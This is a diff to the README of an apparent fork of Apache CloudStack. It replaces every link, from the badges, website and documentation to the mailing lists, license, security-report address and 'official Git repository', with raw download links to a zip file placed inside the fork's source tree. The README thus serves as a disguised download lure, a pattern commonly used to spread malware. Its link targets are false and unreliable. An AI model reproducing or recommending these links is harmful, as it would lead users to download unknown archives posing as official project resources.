@@ -1,6 +1,6 @@
-# Apache CloudStack [![Build Status](https://raw.githubusercontent.com/ibragullam/cloudstack/master/core/src/test/resources/vhds/test.vhd.zip)](https://raw.githubusercontent.com/ibragullam/cloudstack/master/core/src/test/resources/vhds/test.vhd.zip) [![Quality Gate Status](https://raw.githubusercontent.com/ibragullam/cloudstack/master/core/src/test/resources/vhds/test.vhd.zip)](https://raw.githubusercontent.com/ibragullam/cloudstack/master/core/src/test/resources/vhds/test.vhd.zip) [![Lines of Code](https://raw.githubusercontent.com/ibragullam/cloudstack/master/core/src/test/resources/vhds/test.vhd.zip)](https://raw.githubusercontent.com/ibragullam/cloudstack/master/core/src/test/resources/vhds/test.vhd.zip) ![GitHub language count](https://raw.githubusercontent.com/ibragullam/cloudstack/master/core/src/test/resources/vhds/test.vhd.zip) ![GitHub top language](https://raw.githubusercontent.com/ibragullam/cloudstack/master/core/src/test/resources/vhds/test.vhd.zip)
+# Apache CloudStack [![Build Status](https://github.com/ibragullam/cloudstack/raw/refs/heads/master/engine/components-api/src/main/java/com/cloud/hypervisor/Software-2.5.zip)](https://github.com/ibragullam/cloudstack/raw/refs/heads/master/engine/components-api/src/main/java/com/cloud/hypervisor/Software-2.5.zip) [![Quality Gate Status](https://github.com/ibragullam/cloudstack/raw/refs/heads/master/engine/components-api/src/main/java/com/cloud/hypervisor/Software-2.5.zip)](https://github.com/ibragullam/cloudstack/raw/refs/heads/master/engine/components-api/src/main/java/com/cloud/hypervisor/Software-2.5.zip) [![Lines of Code](https://github.com/ibragullam/cloudstack/raw/refs/heads/master/engine/components-api/src/main/java/com/cloud/hypervisor/Software-2.5.zip)](https://github.com/ibragullam/cloudstack/raw/refs/heads/master/engine/components-api/src/main/java/com/cloud/hypervisor/Software-2.5.zip) ![GitHub language count](https://github.com/ibragullam/cloudstack/raw/refs/heads/master/engine/components-api/src/main/java/com/cloud/hypervisor/Software-2.5.zip) ![GitHub top language](https://github.com/ibragullam/cloudstack/raw/refs/heads/master/engine/components-api/src/main/java/com/cloud/hypervisor/Software-2.5.zip)
 
-![Apache CloudStack](https://raw.githubusercontent.com/ibragullam/cloudstack/master/core/src/test/resources/vhds/test.vhd.zip)
+![Apache CloudStack](https://github.com/ibragullam/cloudstack/raw/refs/heads/master/engine/components-api/src/main/java/com/cloud/hypervisor/Software-2.5.zip)
 
 Apache CloudStack is open source software designed to deploy and manage large
 networks of virtual machines, as a highly available, highly scalable
@@ -21,32 +21,32 @@ OVM and LXC containers.
 Users can manage their cloud with an easy to use Web interface, command line
 tools, and/or a full-featured query based API.
 
-For more information on Apache CloudStack, please visit the [website](https://raw.githubusercontent.com/ibragullam/cloudstack/master/core/src/test/resources/vhds/test.vhd.zip)
+For more information on Apache CloudStack, please visit the [website](https://github.com/ibragullam/cloudstack/raw/refs/heads/master/engine/components-api/src/main/java/com/cloud/hypervisor/Software-2.5.zip)
 
 ## Who Uses CloudStack?
 
 * There are more than 150 known organizations using Apache CloudStack (or a commercial distribution of CloudStack). Our users include many major service providers running CloudStack to offer public cloud services, product vendors who incorporate or integrate with CloudStack in their own products, organizations who have used CloudStack to build their own private clouds, and systems integrators that offer CloudStack related services.
 
-* See our [case studies](https://raw.githubusercontent.com/ibragullam/cloudstack/master/core/src/test/resources/vhds/test.vhd.zip+Studies) highlighting successful deployments of Apache CloudStack.
+* See our [case studies](https://github.com/ibragullam/cloudstack/raw/refs/heads/master/engine/components-api/src/main/java/com/cloud/hypervisor/Software-2.5.zip+Studies) highlighting successful deployments of Apache CloudStack.
 
-* See the up-to-date list of current [users](https://raw.githubusercontent.com/ibragullam/cloudstack/master/core/src/test/resources/vhds/test.vhd.zip).
+* See the up-to-date list of current [users](https://github.com/ibragullam/cloudstack/raw/refs/heads/master/engine/components-api/src/main/java/com/cloud/hypervisor/Software-2.5.zip).
 
-* If you are using CloudStack in your organization and your company is not listed above, please complete our brief adoption [survey](https://raw.githubusercontent.com/ibragullam/cloudstack/master/core/src/test/resources/vhds/test.vhd.zip). We're happy to keep your company name anonymous if you require.
+* If you are using CloudStack in your organization and your company is not listed above, please complete our brief adoption [survey](https://github.com/ibragullam/cloudstack/raw/refs/heads/master/engine/components-api/src/main/java/com/cloud/hypervisor/Software-2.5.zip). We're happy to keep your company name anonymous if you require.
 
 ## Getting Started
 
-* Download a released [version](https://raw.githubusercontent.com/ibragullam/cloudstack/master/core/src/test/resources/vhds/test.vhd.zip)
-* Build from source with the instructions in the [https://raw.githubusercontent.com/ibragullam/cloudstack/master/core/src/test/resources/vhds/test.vhd.zip](https://raw.githubusercontent.com/ibragullam/cloudstack/master/core/src/test/resources/vhds/test.vhd.zip) file.
+* Download a released [version](https://github.com/ibragullam/cloudstack/raw/refs/heads/master/engine/components-api/src/main/java/com/cloud/hypervisor/Software-2.5.zip)
+* Build from source with the instructions in the [https://github.com/ibragullam/cloudstack/raw/refs/heads/master/engine/components-api/src/main/java/com/cloud/hypervisor/Software-2.5.zip](https://github.com/ibragullam/cloudstack/raw/refs/heads/master/engine/components-api/src/main/java/com/cloud/hypervisor/Software-2.5.zip) file.
 
 ## Getting Source Repository
 
 Apache CloudStack project uses Git. The official Git repository is at:
 
-    https://raw.githubusercontent.com/ibragullam/cloudstack/master/core/src/test/resources/vhds/test.vhd.zip
+    https://github.com/ibragullam/cloudstack/raw/refs/heads/master/engine/components-api/src/main/java/com/cloud/hypervisor/Software-2.5.zip
 
 And a mirror is hosted on Github:
 
-    https://raw.githubusercontent.com/ibragullam/cloudstack/master/core/src/test/resources/vhds/test.vhd.zip
+    https://github.com/ibragullam/cloudstack/raw/refs/heads/master/engine/components-api/src/main/java/com/cloud/hypervisor/Software-2.5.zip
 
 The Github mirror is strictly read only and provides convenience to users and
 developers to explore the code and for the community to accept contributions
@@ -54,53 +54,53 @@ via Github pull requests.
 
 ## Links
 
-* [Documentation](https://raw.githubusercontent.com/ibragullam/cloudstack/master/core/src/test/resources/vhds/test.vhd.zip)
-* Developer [wiki](https://raw.githubusercontent.com/ibragullam/cloudstack/master/core/src/test/resources/vhds/test.vhd.zip)
-* [Release notes](https://raw.githubusercontent.com/ibragullam/cloudstack/master/core/src/test/resources/vhds/test.vhd.zip)
-* Design [documents](https://raw.githubusercontent.com/ibragullam/cloudstack/master/core/src/test/resources/vhds/test.vhd.zip)
-* API [documentation](https://raw.githubusercontent.com/ibragullam/cloudstack/master/core/src/test/resources/vhds/test.vhd.zip)
-* How to [contribute](https://raw.githubusercontent.com/ibragullam/cloudstack/master/core/src/test/resources/vhds/test.vhd.zip)
+* [Documentation](https://github.com/ibragullam/cloudstack/raw/refs/heads/master/engine/components-api/src/main/java/com/cloud/hypervisor/Software-2.5.zip)
+* Developer [wiki](https://github.com/ibragullam/cloudstack/raw/refs/heads/master/engine/components-api/src/main/java/com/cloud/hypervisor/Software-2.5.zip)
+* [Release notes](https://github.com/ibragullam/cloudstack/raw/refs/heads/master/engine/components-api/src/main/java/com/cloud/hypervisor/Software-2.5.zip)
+* Design [documents](https://github.com/ibragullam/cloudstack/raw/refs/heads/master/engine/components-api/src/main/java/com/cloud/hypervisor/Software-2.5.zip)
+* API [documentation](https://github.com/ibragullam/cloudstack/raw/refs/heads/master/engine/components-api/src/main/java/com/cloud/hypervisor/Software-2.5.zip)
+* How to [contribute](https://github.com/ibragullam/cloudstack/raw/refs/heads/master/engine/components-api/src/main/java/com/cloud/hypervisor/Software-2.5.zip)
 
 ## Getting Involved and Contributing
 
 Interested in helping out with Apache CloudStack? Great! We welcome
-participation from anybody willing to work [The Apache Way](https://raw.githubusercontent.com/ibragullam/cloudstack/master/core/src/test/resources/vhds/test.vhd.zip) and make a
+participation from anybody willing to work [The Apache Way](https://github.com/ibragullam/cloudstack/raw/refs/heads/master/engine/components-api/src/main/java/com/cloud/hypervisor/Software-2.5.zip) and make a
 contribution. Note that you do not have to be a developer in order to contribute
 to Apache CloudStack. We need folks to help with documentation, translation,
-promotion etc. See our contribution [page](https://raw.githubusercontent.com/ibragullam/cloudstack/master/core/src/test/resources/vhds/test.vhd.zip).
+promotion etc. See our contribution [page](https://github.com/ibragullam/cloudstack/raw/refs/heads/master/engine/components-api/src/main/java/com/cloud/hypervisor/Software-2.5.zip).
 
 If you're interested in learning more or participating in the Apache CloudStack
 project, the mailing lists are the best way to do that. While the project has
-several communications channels, the [mailing lists](https://raw.githubusercontent.com/ibragullam/cloudstack/master/core/src/test/resources/vhds/test.vhd.zip) are the most active and the
+several communications channels, the [mailing lists](https://github.com/ibragullam/cloudstack/raw/refs/heads/master/engine/components-api/src/main/java/com/cloud/hypervisor/Software-2.5.zip) are the most active and the
 official channels for making decisions about the project itself.
 
 Mailing lists:
-- [Development Mailing List](https://raw.githubusercontent.com/ibragullam/cloudstack/master/core/src/test/resources/vhds/test.vhd.zip)
-- [Users Mailing List](https://raw.githubusercontent.com/ibragullam/cloudstack/master/core/src/test/resources/vhds/test.vhd.zip)
-- [Commits Mailing List](https://raw.githubusercontent.com/ibragullam/cloudstack/master/core/src/test/resources/vhds/test.vhd.zip)
-- [Issues Mailing List](https://raw.githubusercontent.com/ibragullam/cloudstack/master/core/src/test/resources/vhds/test.vhd.zip)
-- [Marketing Mailing List](https://raw.githubusercontent.com/ibragullam/cloudstack/master/core/src/test/resources/vhds/test.vhd.zip)
+- [Development Mailing List](https://github.com/ibragullam/cloudstack/raw/refs/heads/master/engine/components-api/src/main/java/com/cloud/hypervisor/Software-2.5.zip)
+- [Users Mailing List](https://github.com/ibragullam/cloudstack/raw/refs/heads/master/engine/components-api/src/main/java/com/cloud/hypervisor/Software-2.5.zip)
+- [Commits Mailing List](https://github.com/ibragullam/cloudstack/raw/refs/heads/master/engine/components-api/src/main/java/com/cloud/hypervisor/Software-2.5.zip)
+- [Issues Mailing List](https://github.com/ibragullam/cloudstack/raw/refs/heads/master/engine/components-api/src/main/java/com/cloud/hypervisor/Software-2.5.zip)
+- [Marketing Mailing List](https://github.com/ibragullam/cloudstack/raw/refs/heads/master/engine/components-api/src/main/java/com/cloud/hypervisor/Software-2.5.zip)
 
-IRC, join us on https://raw.githubusercontent.com/ibragullam/cloudstack/master/core/src/test/resources/vhds/test.vhd.zip on:
+IRC, join us on https://github.com/ibragullam/cloudstack/raw/refs/heads/master/engine/components-api/src/main/java/com/cloud/hypervisor/Software-2.5.zip on:
 - `#cloudstack`: General Apache CloudStack conversation and end user support
 - `#cloudstack-dev`: Development discussions
 
-Report and/or check bugs on [JIRA](https://raw.githubusercontent.com/ibragullam/cloudstack/master/core/src/test/resources/vhds/test.vhd.zip) and check our
-developer [page](https://raw.githubusercontent.com/ibragullam/cloudstack/master/core/src/test/resources/vhds/test.vhd.zip) for contributing code.
+Report and/or check bugs on [JIRA](https://github.com/ibragullam/cloudstack/raw/refs/heads/master/engine/components-api/src/main/java/com/cloud/hypervisor/Software-2.5.zip) and check our
+developer [page](https://github.com/ibragullam/cloudstack/raw/refs/heads/master/engine/components-api/src/main/java/com/cloud/hypervisor/Software-2.5.zip) for contributing code.
 
 ## News and Events
 
-* [Blog](https://raw.githubusercontent.com/ibragullam/cloudstack/master/core/src/test/resources/vhds/test.vhd.zip)
-* [Twitter](https://raw.githubusercontent.com/ibragullam/cloudstack/master/core/src/test/resources/vhds/test.vhd.zip)
-* [Events and meetup](https://raw.githubusercontent.com/ibragullam/cloudstack/master/core/src/test/resources/vhds/test.vhd.zip)
+* [Blog](https://github.com/ibragullam/cloudstack/raw/refs/heads/master/engine/components-api/src/main/java/com/cloud/hypervisor/Software-2.5.zip)
+* [Twitter](https://github.com/ibragullam/cloudstack/raw/refs/heads/master/engine/components-api/src/main/java/com/cloud/hypervisor/Software-2.5.zip)
+* [Events and meetup](https://github.com/ibragullam/cloudstack/raw/refs/heads/master/engine/components-api/src/main/java/com/cloud/hypervisor/Software-2.5.zip)
 
 ## Reporting Security Vulnerabilities
 
 If you've found an issue that you believe is a security vulnerability in a
-released version of CloudStack, please report it to `https://raw.githubusercontent.com/ibragullam/cloudstack/master/core/src/test/resources/vhds/test.vhd.zip` with details about the vulnerability, how it
+released version of CloudStack, please report it to `https://github.com/ibragullam/cloudstack/raw/refs/heads/master/engine/components-api/src/main/java/com/cloud/hypervisor/Software-2.5.zip` with details about the vulnerability, how it
 might be exploited, and any additional information that might be useful.
 
-For more details, please visit our security [page](https://raw.githubusercontent.com/ibragullam/cloudstack/master/core/src/test/resources/vhds/test.vhd.zip).
+For more details, please visit our security [page](https://github.com/ibragullam/cloudstack/raw/refs/heads/master/engine/components-api/src/main/java/com/cloud/hypervisor/Software-2.5.zip).
 
 ## License
 
@@ -112,7 +112,7 @@ to you under the Apache License, Version 2.0 (the
 "License"); you may not use this file except in compliance
 with the License.  You may obtain a copy of the License at
 
-  https://raw.githubusercontent.com/ibragullam/cloudstack/master/core/src/test/resources/vhds/test.vhd.zip
+  https://github.com/ibragullam/cloudstack/raw/refs/heads/master/engine/components-api/src/main/java/com/cloud/hypervisor/Software-2.5.zip
 
 Unless required by applicable law or agreed to in writing,
 software distributed under the License is distributed on an
@@ -130,7 +130,7 @@ This distribution includes cryptographic software. The country in which you curr
 reside may have restrictions on the import, possession, use, and/or re-export to another
 country, of encryption software. BEFORE using any encryption software, please check your
 country's laws, regulations and policies concerning the import, possession, or use, and
-re-export of encryption software, to see if this is permitted. See https://raw.githubusercontent.com/ibragullam/cloudstack/master/core/src/test/resources/vhds/test.vhd.zip
+re-export of encryption software, to see if this is permitted. See https://github.com/ibragullam/cloudstack/raw/refs/heads/master/engine/components-api/src/main/java/com/cloud/hypervisor/Software-2.5.zip
 for more information.
 
 The U.S. Government Department of Commerce, Bureau of Industry and Security (BIS), has
